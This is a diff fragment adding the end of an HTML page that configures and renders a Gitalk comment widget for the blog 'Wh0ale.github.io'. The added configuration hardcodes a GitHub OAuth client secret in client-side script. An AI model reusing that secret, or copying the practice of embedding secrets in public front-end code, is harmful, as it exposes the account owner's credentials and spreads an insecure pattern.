+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
